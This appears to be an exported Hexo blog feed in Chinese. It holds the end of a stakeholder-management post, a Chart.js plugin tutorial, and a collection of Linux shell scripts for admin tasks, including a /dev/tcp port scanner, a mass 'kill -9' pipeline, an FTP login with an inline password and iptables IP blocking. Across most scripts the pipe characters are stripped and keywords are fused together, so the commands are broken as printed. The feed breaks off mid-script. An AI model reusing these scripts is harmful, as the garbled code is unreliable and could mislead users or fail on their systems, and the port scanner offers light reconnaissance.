src="http://image.woshipm.com/wp-files/2022/03/HUYQ8VkJediQnccEiADP.png"></p><p><img src="http://image.woshipm.com/wp-files/2022/03/fJx3qbDEDTO8jDT5VvwA.png"></p><p>用干系人地图对干系人进行分类、排优先级：</p><p><img src="http://image.woshipm.com/wp-files/2022/03/NQANwUmUGruX9dgkIlq4.png"></p><h3 id="4-干系人管理"><a href="#4-干系人管理" class="headerlink" title="4. 干系人管理"></a>4. 干系人管理</h3><p>应用干系人地图，对干系人采用不同的策略进行分类管理：</p><p><img src="http://image.woshipm.com/wp-files/2022/03/90xuSM3FqSIZD4YxGkc3.png"></p><p>对干系人提的需求进行需求分析，得到功能需求：</p><p><img src="http://image.woshipm.com/wp-files/2022/03/jykGEBcIBdWRcfF342Z7.png"></p><p><img src="http://image.woshipm.com/wp-files/2022/03/XJHpAnk6OtrimviDdcTz.png"></p><h2 id="六、小结"><a href="#六、小结" class="headerlink" title="六、小结"></a>六、小结</h2><p><img src="http://image.woshipm.com/wp-files/2022/03/UPVDkLmhNo92W32483No.png"></p><p>有效的干系人管理是项目成功的重要保证。</p><p>C端产品的干系人管理要特别注意监管机构。</p><p>B端项目的干系人相对C端产品而言更加复杂多样，所以本文举的例子主要是B端项目的案例。</p><p>还需要注意的是，干系人分析不是一次性任务。</p><p>因为随着项目的进展，干系人的权力、对项目的态度、优先级可能会发生变化。</p><p>因此，干系人管理是一项持续进行的行动。</p><p>随着在整个项目期间各种事件不断发生，项目团队可能需要根据新的干系人或环境的不断变化而重新进行优先级排序、调整应对策略。</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目管理 </tag>
            
            <tag> 初级 </tag>
            
            <tag> 干系人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记使用Chart动态图表</title>
      <link href="/72.html"/>
      <url>/72.html</url>
      
        <content type="html"><![CDATA[<p>Chartjs是一款简单优雅的数据可视化工具，对比其他图表库如echarts、highcharts、c3、flot、amchart等，它的画面效果、动态效果都更精致，它的 <a href="https://chartjs.bootcss.com/">文档首页</a> 就透出一股小清新，基于 HTML5 Canvas，它拥有更好的性能且响应式，基本满足了一般数据展示的需要，包括折线图，条形图，饼图，散点图，雷达图，极地图，甜甜圈图等。</p><h2 id="Hexo-中的-Chartjs"><a href="#Hexo-中的-Chartjs" class="headerlink" title="Hexo 中的 Chartjs"></a>Hexo 中的 Chartjs</h2><p>插件的安装和使用非常的简单，只需要进入博客目录，然后打开命令行，用npm安装一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-tag-chart --save</span><br></pre></td></tr></table></figure><p>之后在文章内使用 chart 的 tag 就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% chart 90% 300 %&#125;</span><br><span class="line">\\TODO option goes here</span><br><span class="line">&#123;% endchart %&#125;</span><br></pre></td></tr></table></figure><p>其中 chart 是标签名，endchart 是结束标签，不需要更改，90% 是图表容器的相对宽度，默认是100%，300 是图表容器的高度，默认是按正常比例缩放的，你可以通过设置 options 里面的 aspectRatio 属性来调整宽高比例，另外还有许多属性可以自定义，你可以查看 <a href="https://www.chartjs.org/">官方文档</a>。在标签之间的部分，都是需要自己填充的图表数据和属性。</p><p>我们来看一个样例，你可以把鼠标移上去看看动态效果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;% chart 90% 300 %&#125;</span><br><span class="line">    &#123;</span><br><span class="line">    type: &#x27;line&#x27;,</span><br><span class="line">    data: &#123;</span><br><span class="line">    labels: [&#x27;January&#x27;, &#x27;February&#x27;, &#x27;March&#x27;, &#x27;April&#x27;, &#x27;May&#x27;, &#x27;June&#x27;, &#x27;July&#x27;],</span><br><span class="line">    datasets: [&#123;</span><br><span class="line">        label: &#x27;My First dataset&#x27;,</span><br><span class="line">        backgroundColor: &#x27;rgb(255, 99, 132)&#x27;,</span><br><span class="line">        borderColor: &#x27;rgb(255, 99, 132)&#x27;,</span><br><span class="line">        data: [0, 10, 5, 2, 20, 30, 45]</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;,</span><br><span class="line">    options: &#123;</span><br><span class="line">        responsive: true,</span><br><span class="line">        title: &#123;</span><br><span class="line">        display: true,</span><br><span class="line">        text: &#x27;Chart.js Line Chart&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endchart %&#125;</span><br></pre></td></tr></table></figure><p>上面这个样例可以通过以下代码来实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;% chart 90% 300 %&#125;</span><br><span class="line">    &#123;</span><br><span class="line">    type: &#x27;line&#x27;,</span><br><span class="line">    data: &#123;</span><br><span class="line">    labels: [&#x27;January&#x27;, &#x27;February&#x27;, &#x27;March&#x27;, &#x27;April&#x27;, &#x27;May&#x27;, &#x27;June&#x27;, &#x27;July&#x27;],</span><br><span class="line">    datasets: [&#123;</span><br><span class="line">        label: &#x27;My First dataset&#x27;,</span><br><span class="line">        backgroundColor: &#x27;rgb(255, 99, 132)&#x27;,</span><br><span class="line">        borderColor: &#x27;rgb(255, 99, 132)&#x27;,</span><br><span class="line">        data: [0, 10, 5, 2, 20, 30, 45]</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;,</span><br><span class="line">    options: &#123;</span><br><span class="line">        responsive: true,</span><br><span class="line">        title: &#123;</span><br><span class="line">        display: true,</span><br><span class="line">        text: &#x27;Chart.js Line Chart&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endchart %&#125;</span><br></pre></td></tr></table></figure><p>如果你想了解更多，<a href="https://www.chartjs.org/">官方文档</a> 是不二之选。如果你英语不好，那么可以看看 <a href="https://chartjs.bootcss.com/">中文文档</a>，所有的例子和属性都能在里面找到，祝你玩得开心。如果你觉得这个插件不错，可以去 <a href="https://github.com/Shen-Yu/hexo-tag-chart">github仓库</a> 点个star~</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> chart </tag>
            
            <tag> 动态图表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux shell 脚本使用记录（持续更新ing...）</title>
      <link href="/70.html"/>
      <url>/70.html</url>
      
        <content type="html"><![CDATA[<h2 id="linux-shell-脚本复制特定后缀文件到另外一个文件夹下"><a href="#linux-shell-脚本复制特定后缀文件到另外一个文件夹下" class="headerlink" title="linux shell 脚本复制特定后缀文件到另外一个文件夹下"></a>linux shell 脚本复制特定后缀文件到另外一个文件夹下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /home/*.raw  /mnt/mmc01/</span><br></pre></td></tr></table></figure><p>&#x2F;home&#x2F; 为特定后缀文件的目录<br>*.raw 为特定后缀<br>&#x2F;mnt&#x2F;mmc01&#x2F; 为目标路径</p><h2 id="检测两台服务器指定目录下的文件一致性"><a href="#检测两台服务器指定目录下的文件一致性" class="headerlink" title="检测两台服务器指定目录下的文件一致性"></a>检测两台服务器指定目录下的文件一致性</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">######################################</span><br><span class="line">检测两台服务器指定目录下的文件一致性</span><br><span class="line">#####################################</span><br><span class="line">#通过对比两台服务器上文件的md5值，达到检测一致性的目的</span><br><span class="line">dir=/data/web</span><br><span class="line">b_ip=192.168.88.10</span><br><span class="line">#将指定目录下的文件全部遍历出来并作为md5sum命令的参数，进而得到所有文件的md5值，并写入到指定文件中</span><br><span class="line">find $dir -type fxargs md5sum &gt; /tmp/md5_a.txt</span><br><span class="line">ssh $b_ip &quot;find $dir -type fxargs md5sum &gt; /tmp/md5_b.txt&quot;</span><br><span class="line">scp $b_ip:/tmp/md5_b.txt /tmp</span><br><span class="line">#将文件名作为遍历对象进行一一比对</span><br><span class="line">for f in `awk &#x27;&#123;print 2&#125; /tmp/md5_a.txt&#x27;`do</span><br><span class="line">#以a机器为标准，当b机器不存在遍历对象中的文件时直接输出不存在的结果</span><br><span class="line">if grep -qw &quot;$f&quot; /tmp/md5_b.txt</span><br><span class="line">then</span><br><span class="line">md5_a=`grep -w &quot;$f&quot; /tmp/md5_a.txtawk &#x27;&#123;print 1&#125;&#x27;`</span><br><span class="line">md5_b=`grep -w &quot;$f&quot; /tmp/md5_b.txtawk &#x27;&#123;print 1&#125;&#x27;`</span><br><span class="line">#当文件存在时，如果md5值不一致则输出文件改变的结果</span><br><span class="line">if [ $md5_a != $md5_b ]then</span><br><span class="line">echo &quot;$f changed.&quot;</span><br><span class="line">fi</span><br><span class="line">else</span><br><span class="line">echo &quot;$f deleted.&quot;</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="定时清空文件内容，定时记录文件大小"><a href="#定时清空文件内容，定时记录文件大小" class="headerlink" title="定时清空文件内容，定时记录文件大小"></a>定时清空文件内容，定时记录文件大小</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#################################################################</span><br><span class="line">每小时执行一次脚本（任务计划），当时间为0点或12点时，将目标目录下的所有文件内#容清空，但不删除文件，其他时间则只统计各个文件的大小，一个文件一行，输出到以时#间和日期命名的文件中，需要考虑目标目录下二级、三级等子目录的文件</span><br><span class="line">################################################################</span><br><span class="line">logfile=/tmp/`date +%H-%F`.log</span><br><span class="line">n=`date +%H`</span><br><span class="line">if [ $n -eq 00 ]  [ $n -eq 12 ]</span><br><span class="line">then</span><br><span class="line">#通过for循环，以find命令作为遍历条件，将目标目录下的所有文件进行遍历并做相应操作</span><br><span class="line">for i in `find /data/log/ -type f`</span><br><span class="line">do</span><br><span class="line">true &gt; $i</span><br><span class="line">done</span><br><span class="line">else</span><br><span class="line">for i in `find /data/log/ -type f`</span><br><span class="line">do</span><br><span class="line">du -sh $i &gt;&gt; $logfile</span><br><span class="line">done</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h2 id="检测网卡流量，并按规定格式记录在日志中"><a href="#检测网卡流量，并按规定格式记录在日志中" class="headerlink" title="检测网卡流量，并按规定格式记录在日志中"></a>检测网卡流量，并按规定格式记录在日志中</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#######################################################</span><br><span class="line">#检测网卡流量，并按规定格式记录在日志中#规定一分钟记录一次</span><br><span class="line">#日志格式如下所示:</span><br><span class="line">#2019-08-12 20:40</span><br><span class="line">#ens33 input: 1234bps</span><br><span class="line">#ens33 output: 1235bps</span><br><span class="line">######################################################3</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">#设置语言为英文，保障输出结果是英文，否则会出现bug</span><br><span class="line">LANG=en</span><br><span class="line">logfile=/tmp/`date +%d`.log</span><br><span class="line">#将下面执行的命令结果输出重定向到logfile日志中</span><br><span class="line">exec &gt;&gt; $logfile</span><br><span class="line">date +&quot;%F %H:%M&quot;</span><br><span class="line">#sar命令统计的流量单位为kb/s，日志格式为bps，因此要*1000*8</span><br><span class="line">sar -n DEV 1 59grep Averagegrep ens33awk &#x27;&#123;print $2,&quot;\t&quot;,&quot;input:&quot;,&quot;\t&quot;,$5*1000*8,&quot;bps&quot;,&quot;\n&quot;,$2,&quot;\t&quot;,&quot;output:&quot;,&quot;\t&quot;,$6*1000*8,&quot;bps&quot;&#125;&#x27;</span><br><span class="line">echo &quot;####################&quot;</span><br><span class="line">#因为执行sar命令需要59秒，因此不需要sleep</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="计算文档每行出现的数字个数，并计算整个文档的数字总数"><a href="#计算文档每行出现的数字个数，并计算整个文档的数字总数" class="headerlink" title="计算文档每行出现的数字个数，并计算整个文档的数字总数"></a>计算文档每行出现的数字个数，并计算整个文档的数字总数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#########################################################</span><br><span class="line">#计算文档每行出现的数字个数，并计算整个文档的数字总数</span><br><span class="line">########################################################</span><br><span class="line">#使用awk只输出文档行数（截取第一段）</span><br><span class="line">n=`wc -l a.txtawk &#x27;&#123;print $1&#125;&#x27;`</span><br><span class="line">sum=0</span><br><span class="line">#文档中每一行可能存在空格，因此不能直接用文档内容进行遍历</span><br><span class="line">for i in `seq 1 $n`do</span><br><span class="line">#输出的行用变量表示时，需要用双引号</span><br><span class="line">line=`sed -n &quot;$i&quot;p a.txt`#wc -L选项，统计最长行的长度</span><br><span class="line">n_n=`echo $linesed s&#x27;/[^0-9]//&#x27;gwc -L`</span><br><span class="line">echo $n_nsum=$[$sum+$n_n]</span><br><span class="line">done</span><br><span class="line">echo &quot;sum:$sum&quot;</span><br></pre></td></tr></table></figure><h2 id="杀死所有进程"><a href="#杀死所有进程" class="headerlink" title="杀死所有进程"></a>杀死所有进程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">################################################################</span><br><span class="line">#有一些脚本加入到了cron之中，存在脚本尚未运行完毕又有新任务需要执行的情况，</span><br><span class="line">#导致系统负载升高，因此可通过编写脚本，筛选出影响负载的进程一次性全部杀死。</span><br><span class="line">################################################################</span><br><span class="line">ps auxgrep 指定进程名grep -v grepawk &#x27;&#123;print $2&#125;&#x27;xargs kill -9</span><br></pre></td></tr></table></figure><h2 id="从FTP服务器下载文件"><a href="#从FTP服务器下载文件" class="headerlink" title="从FTP服务器下载文件"></a>从FTP服务器下载文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ $# -ne 1 ]; then</span><br><span class="line">    echo &quot;Usage: $0 filename&quot;</span><br><span class="line">fi</span><br><span class="line">dir=$(dirname $1)</span><br><span class="line">file=$(basename $1)</span><br><span class="line">ftp -n -v &lt;&lt; EOF   # -n 自动登录</span><br><span class="line">open 192.168.1.10  # ftp服务器</span><br><span class="line">user admin password</span><br><span class="line">binary   # 设置ftp传输模式为二进制，避免MD5值不同或.tar.gz压缩包格式错误</span><br><span class="line">cd $dir</span><br><span class="line">get &quot;$file&quot;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h2 id="连续输入5个100以内的数字，统计和、最小和最大"><a href="#连续输入5个100以内的数字，统计和、最小和最大" class="headerlink" title="连续输入5个100以内的数字，统计和、最小和最大"></a>连续输入5个100以内的数字，统计和、最小和最大</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">COUNT=1</span><br><span class="line">SUM=0</span><br><span class="line">MIN=0</span><br><span class="line">MAX=100</span><br><span class="line">while [ $COUNT -le 5 ]; do</span><br><span class="line">    read -p &quot;请输入1-10个整数：&quot; INT    </span><br><span class="line">    if [[ ! $INT =~ ^[0-9]+$ ]]; then</span><br><span class="line">        echo &quot;输入必须是整数！&quot;</span><br><span class="line">        exit 1</span><br><span class="line">    elif [[ $INT -gt 100 ]]; then</span><br><span class="line">        echo &quot;输入必须是100以内！&quot;</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">    SUM=$(($SUM+$INT))</span><br><span class="line">    [ $MIN -lt $INT ] &amp;&amp; MIN=$INT</span><br><span class="line">    [ $MAX -gt $INT ] &amp;&amp; MAX=$INT</span><br><span class="line">    let COUNT++</span><br><span class="line">    done</span><br><span class="line">echo &quot;SUM: $SUM&quot;</span><br><span class="line">echo &quot;MIN: $MIN&quot;</span><br><span class="line">echo &quot;MAX: $MAX</span><br></pre></td></tr></table></figure><h2 id="监测-Nginx-访问日志-502-情况，并做相应动作"><a href="#监测-Nginx-访问日志-502-情况，并做相应动作" class="headerlink" title="监测 Nginx 访问日志 502 情况，并做相应动作"></a>监测 Nginx 访问日志 502 情况，并做相应动作</h2><p>假设服务器环境为 lnmp，近期访问经常出现 502 现象，且 502 错误在重启 php-fpm 服务后消失，因此需要编写监控脚本，一旦出现 502，则自动重启 php-fpm 服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#场景：</span><br><span class="line">#1.访问日志文件的路径：/data/log/access.log</span><br><span class="line">#2.脚本死循环，每10秒检测一次，10秒的日志条数为300条，出现502的比例不低于10%（30条）则需要重启php-fpm服务</span><br><span class="line">#3.重启命令为：/etc/init.d/php-fpm restart</span><br><span class="line">#!/bin/bash</span><br><span class="line">###########################################################</span><br><span class="line">#监测Nginx访问日志502情况，并做相应动作</span><br><span class="line">###########################################################</span><br><span class="line">log=/data/log/access.log</span><br><span class="line">N=30 #设定阈值</span><br><span class="line">while :do</span><br><span class="line"> #查看访问日志的最新300条，并统计502的次数</span><br><span class="line">    err=`tail -n 300 $log grep -c &#x27;502&quot; &#x27;` </span><br><span class="line">if [ $err -ge $N ] </span><br><span class="line">then</span><br><span class="line">/etc/init.d/php-fpm restart 2&gt; /dev/null </span><br><span class="line">#设定60s延迟防止脚本bug导致无限重启php-fpm服务</span><br><span class="line">     sleep 60</span><br><span class="line"> fi</span><br><span class="line"> sleep 10</span><br><span class="line"> done</span><br></pre></td></tr></table></figure><h2 id="批量修改文件名"><a href="#批量修改文件名" class="headerlink" title="批量修改文件名"></a>批量修改文件名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># touch article_&#123;1..3&#125;.html</span><br><span class="line"># lsarticle_1.html  article_2.html  article_3.html</span><br><span class="line"># 目的：把article改为bbs</span><br><span class="line"></span><br><span class="line"># 方法1：</span><br><span class="line">for file in $(ls *html); do</span><br><span class="line">    mv $file bbs_$&#123;file#*_&#125;</span><br><span class="line">    # mv $file $(echo $file sed -r &#x27;s/.*(_.*)/bbs\1/&#x27;)</span><br><span class="line">    # mv $file $(echo $file echo bbs_$(cut -d_ -f2)</span><br><span class="line"></span><br><span class="line"># 方法2：</span><br><span class="line">for file in $(find . -maxdepth 1 -name &quot;*html&quot;); do</span><br><span class="line">     mv $file bbs_$&#123;file#*_&#125;done</span><br><span class="line"></span><br><span class="line"># 方法3：</span><br><span class="line"># rename article bbs *.html</span><br><span class="line">把一个文档前五行中包含字母的行删掉，同时删除6到10行包含的所有字母</span><br><span class="line"></span><br><span class="line">1）准备测试文件，文件名为2.txt</span><br><span class="line"></span><br><span class="line">第1行1234567不包含字母</span><br><span class="line">第2行56789BBBBBB</span><br><span class="line">第3行67890CCCCCCCC</span><br><span class="line">第4行78asdfDDDDDDDDD</span><br><span class="line">第5行123456EEEEEEEE</span><br><span class="line">第6行1234567ASDF</span><br><span class="line">第7行56789ASDF</span><br><span class="line">第8行67890ASDF</span><br><span class="line">第9行78asdfADSF</span><br><span class="line">第10行123456AAAA</span><br><span class="line">第11行67890ASDF</span><br><span class="line">第12行78asdfADSF</span><br><span class="line">第13行123456AAAA</span><br><span class="line"></span><br><span class="line">2）脚本如下：</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line">###############################################################</span><br><span class="line">把一个文档前五行中包含字母的行删掉，同时删除6到10行包含的所有字母</span><br><span class="line">##############################################################</span><br><span class="line">sed -n &#x27;1,5&#x27;p 2.txt sed &#x27;/[a-zA-Z]/&#x27;d</span><br><span class="line">sed -n &#x27;6,10&#x27;p 2.txt sed s&#x27;/[a-zA-Z]//&#x27;g</span><br><span class="line">sed -n &#x27;11,$&#x27;p 2.txt</span><br><span class="line">#最终结果只是在屏幕上打印结果，如果想直接更改文件，</span><br><span class="line">#可将输出结果写入临时文件中，再替换2.txt或者使用-i选项</span><br></pre></td></tr></table></figure><h2 id="扫描主机端口状态"><a href="#扫描主机端口状态" class="headerlink" title="扫描主机端口状态"></a>扫描主机端口状态</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">HOST=$1</span><br><span class="line">PORT=&quot;22 25 80 8080&quot;</span><br><span class="line">for PORT in $PORT; do</span><br><span class="line">    if echo &amp;&gt;/dev/null &gt; /dev/tcp/$HOST/$PORT; then</span><br><span class="line">        echo &quot;$PORT open&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;$PORT close&quot;</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line">用 shell 打印示例语句中字母数小于6的单词</span><br><span class="line"></span><br><span class="line">#示例语句：</span><br><span class="line">#Bash also interprets a number of multi-character options.</span><br><span class="line">#!/bin/bash</span><br><span class="line">##############################################################</span><br><span class="line">#shell打印示例语句中字母数小于6的单词</span><br><span class="line">##############################################################</span><br><span class="line">for s in Bash also interprets a number of multi-character options.</span><br><span class="line">do</span><br><span class="line"> n=`echo $swc -c` </span><br><span class="line"> if [ $n -lt 6 ] </span><br><span class="line"> then</span><br><span class="line"> echo $s</span><br><span class="line"> fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="iptables-自动屏蔽访问网站频繁的IP"><a href="#iptables-自动屏蔽访问网站频繁的IP" class="headerlink" title="iptables 自动屏蔽访问网站频繁的IP"></a>iptables 自动屏蔽访问网站频繁的IP</h2><p>场景：恶意访问,安全防范</p><p>1）屏蔽每分钟访问超过200的IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">方法1：根据访问日志（Nginx为例）</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line">DATE=$(date +%d/%b/%Y:%H:%M)</span><br><span class="line">ABNORMAL_IP=$(tail -n5000 access.log grep $DATE awk &#x27;&#123;a[$1]++&#125;END&#123;for(i in a)if(a[i]&gt;100)print i&#125;&#x27;)</span><br><span class="line">#先tail防止文件过大，读取慢，数字可调整每分钟最大的访问量。awk不能直接过滤日志，因为包含特殊字符。</span><br><span class="line">for IP in $ABNORMAL_IP; do</span><br><span class="line">    if [ $(iptables -vnL grep -c &quot;$IP&quot;) -eq 0 ]; then</span><br><span class="line">        iptables -I INPUT -s $IP -j DROP    fidone</span><br><span class="line">        </span><br><span class="line">方法2：通过TCP建立的连接</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line">ABNORMAL_IP=$(netstat -an awk &#x27;$4~/:80$/ &amp;&amp; $6~/ESTABLISHED/&#123;gsub(/:[0-9]+/,&quot;&quot;,$5);&#123;a[$5]++&#125;&#125;END&#123;for(i in a)if(a[i]&gt;100)print i&#125;&#x27;)</span><br><span class="line">#gsub是将第五列（客户端IP）的冒号和端口去掉</span><br><span class="line">for IP in $ABNORMAL_IP; do</span><br><span class="line">    if [ $(iptables -vnL grep -c &quot;$IP&quot;) -eq 0 ]; then</span><br><span class="line">        iptables -I INPUT -s $IP -j DROP    </span><br><span class="line">        fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>2）屏蔽每分钟SSH尝试登录超过10次的IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 